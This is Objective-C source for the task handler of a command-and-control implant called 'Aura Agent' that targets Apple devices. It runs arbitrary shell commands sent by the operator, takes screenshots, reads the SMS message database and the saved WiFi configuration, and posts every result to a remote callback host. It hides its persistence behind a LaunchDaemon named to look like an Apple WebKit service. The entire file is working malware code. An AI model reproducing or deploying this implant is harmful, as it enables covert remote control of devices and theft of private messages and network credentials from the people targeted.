#import "C2Task.h"
#import "HTTPC2Config.h"
#import "C2CheckIn.h"
#import "NSTask.h"
#import "SystemInfoHelper.h"
#import "SMSReader.h"
#import "WiFiConfigReader.h"

@implementation C2Task

- (instancetype)initWithDictionary:(NSDictionary *)dict {
    self = [super init];
    if (self) {
        _taskID = dict[@"id"];
        _command = dict[@"command"];
        _parameters = dict[@"parameters"];
        _timestamp = [dict[@"timestamp"] doubleValue];
    }
    return self;
}

- (void)executeTask {
    NSLog(@"[DEBUG] 💥 Executing task: %@", self.command);

    // Dictionary mapping command strings to blocks (similar to a switch case)
    NSDictionary<NSString *, void (^)(void)> *taskCommandMap = @{
        @"exit": ^{
            BOOL deletionSuccess = [SystemInfoHelper uninstallAgent];
            NSString *responseMessage = deletionSuccess ? @"🗑️ Aura payload deleted..." : @"❌ Error deleting the Aura payload.";
            NSString *status = deletionSuccess ? @"success" : @"error";
            [self submitTaskResponseWithOutput:responseMessage status:status completed:NO];

            // Remove persistence if running as root
            if ([SystemInfoHelper isRootUser]) {
                NSString *plistPath = @"/Library/LaunchDaemons/com.apple.WebKit.Networking.plist";
                NSFileManager *fileManager = [NSFileManager defaultManager];
                
                if ([fileManager fileExistsAtPath:plistPath]) {
                    NSLog(@"Removing plist at path: %@", plistPath);
                    NSError *removeError = nil;
                    [fileManager removeItemAtPath:plistPath error:&removeError];
                    if (removeError) {
                        [self submitTaskResponseWithOutput:[NSString stringWithFormat:@"❌ Error deleting plist: %@", removeError.localizedDescription] status:@"error" completed:NO];
                    } else {
                        [self submitTaskResponseWithOutput:@"\n📋 Backing LaunchDaemon plist deleted..." status:@"success" completed:NO];
                    }
                } else {
                    NSLog(@"Plist not found at path: %@", plistPath);
                }

                // // Remove the agent from launchd
                // NSTask *removeTask = [[NSTask alloc] init];
                // removeTask.launchPath = @"/bin/launchctl";
                // removeTask.arguments = @[@"remove", @"com.apple.WebKit.Networking"];
                // [removeTask launch];
                // [removeTask waitUntilExit];

                // if (removeTask.terminationStatus != 0) {
                //     [self submitTaskResponseWithOutput:@"❌ Error removing the Aura Agent from launchd!" status:@"error" completed:YES];
                //     exit(1);
                // } else {
                //     [self submitTaskResponseWithOutput:@"\n🛜 Removed the Aura Agent from launchd." status:@"success" completed:NO];
                // }

                // Unload the agent using launchctl
                [self submitTaskResponseWithOutput:@"\n🛜 Unloading the Aura Agent... this will halt C2 comms" status:@"success" completed:YES];
                NSTask *unloadTask = [[NSTask alloc] init];
                unloadTask.launchPath = @"/bin/launchctl";
                unloadTask.arguments = @[@"unload", @"-w", plistPath];
                [unloadTask launch];
                [unloadTask waitUntilExit];

                if (unloadTask.terminationStatus != 0) {
                    [self submitTaskResponseWithOutput:@"❌ Error unloading the Aura Agent!" status:@"error" completed:YES];
                    exit(1);
                }
            }

            // Final success message
            [self submitTaskResponseWithOutput:@"\n✅ Aura Agent successfully uninstalled!" status:@"success" completed:YES];
            exit(0);
        },
        @"take_screenshot": ^{
            [SystemInfoHelper takeScreenshotWithTask:self];
        },
        @"shell_exec": ^{
            @try {
                // Create an NSTask for shell execution
                NSTask *task = [[NSTask alloc] init];
                NSPipe *outputPipe = [NSPipe pipe];  // Pipe for capturing output

                // Set the executable to /bin/zsh
                task.launchPath = @"/bin/bash";
                // Pass the command to execute as an argument
                task.arguments = @[@"-c", self.parameters];
                // Set the standard output to the pipe
                task.standardOutput = outputPipe;

                // Launch the task
                [task launch];
                [task waitUntilExit];  // Wait for task to complete

                // Read the output data from the pipe
                NSData *outputData = [[outputPipe fileHandleForReading] readDataToEndOfFile];
                NSString *outputString = [[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding];

                if (task.terminationStatus == 0) {
                    // If the task succeeded, return the output
                    [self submitTaskResponseWithOutput:outputString status:@"success" completed:YES];
                } else {
                    // If the task failed, return the error output
                    NSString *errorMessage = [NSString stringWithFormat:@"Shell execution failed with status: %d", task.terminationStatus];
                    [self submitTaskResponseWithOutput:errorMessage status:@"error" completed:YES];
                }
            }
            @catch (NSException *exception) {
                // Catch any exceptions and return them as error output
                NSString *errorMessage = [NSString stringWithFormat:@"Exception caught: %@", exception.reason];
                [self submitTaskResponseWithOutput:errorMessage status:@"error" completed:YES];
            }
        },
        @"messages": ^{
            SMSReader *reader = [[SMSReader alloc] init];
            NSString *jsonResult = [reader fetchMessagesAsJSONFromDatabase:@"/var/mobile/Library/SMS/sms.db"];

            if (jsonResult) {
                NSLog(@"Messages JSON: %@", jsonResult);
                [self submitTaskResponseWithOutput:jsonResult status:@"success" completed:YES];
            } else {
                NSLog(@"Failed to fetch messages.");
                [self submitTaskResponseWithOutput:jsonResult status:@"error" completed:YES];
            }
        },
        @"wifi_config": ^{
            WiFiConfigReader *reader = [[WiFiConfigReader alloc] init];
            NSString *jsonResult = [reader readWiFiConfigAsJSONFromPlist:@"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist"];

            if (jsonResult) {
                NSLog(@"WiFi Config JSON: %@", jsonResult);
                [self submitTaskResponseWithOutput:jsonResult status:@"success" completed:YES];
            } else {
                NSLog(@"Failed to fetch WiFi config.");
                [self submitTaskResponseWithOutput:@"Failed to read WiFi config." status:@"error" completed:YES];
            }
        }
    };

    // Fetch the block for the command, or return an error if not found
    void (^taskBlock)(void) = taskCommandMap[self.command];
    
    if (taskBlock) {
        taskBlock();
    } else {
        NSLog(@"[ERROR] Unknown task command: %@", self.command);
        [self submitTaskResponseWithOutput:@"Unknown command" status:@"error" completed:YES];
    }
}


- (void)submitTaskResponseWithOutput:(NSString *)output status:(NSString *)status completed:(BOOL)completed {
    if (callbackUUID == nil) {
        NSLog(@"[ERROR] No callback UUID available for submitting response.");
        return;
    }

    NSDictionary *responseData = @{
        @"action": @"post_response",
        @"responses": @[
                @{
                    @"task_id": self.taskID,
                    @"user_output": output,
                    @"status": status,
                    @"completed": @(completed)
                }
        ]
    };

    NSError *jsonError;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:responseData options:0 error:&jsonError];
    if (jsonError) {
        NSLog(@"[ERROR] Error creating JSON: %@", jsonError.localizedDescription);
        return;
    }

    NSMutableData *messageData = [[callbackUUID dataUsingEncoding:NSUTF8StringEncoding] mutableCopy];
    [messageData appendData:jsonData];
    NSString *base64ResponseMessage = [messageData base64EncodedStringWithOptions:0];

    NSString *callbackHost = [HTTPC2Config callbackHost];
    NSInteger callbackPort = [HTTPC2Config callbackPort];
    NSString *postURI = @"agent_message";
    NSString *urlString = [NSString stringWithFormat:@"%@:%ld/%@", callbackHost, (long)callbackPort, postURI];
    NSURL *url = [NSURL URLWithString:urlString];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:[base64ResponseMessage dataUsingEncoding:NSUTF8StringEncoding]];
    [request addValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

    NSDictionary *headers = [HTTPC2Config headers];
    for (NSString *key in headers) {
        [request addValue:headers[key] forHTTPHeaderField:key];
    }

    NSURLSession *session = [NSURLSession sharedSession];
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);

    NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[ERROR] Error during task response submission: %@", error.localizedDescription);
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
            if (httpResponse.statusCode == 200) {
                NSLog(@"[DEBUG] Successfully submitted task response for task: %@", self.taskID);
            } else {
                NSLog(@"[ERROR] Failed to submit task response. HTTP Status Code: %ld", (long)httpResponse.statusCode);
            }
        }
        dispatch_semaphore_signal(sema);
    }];

    [task resume];
    dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
}

@end
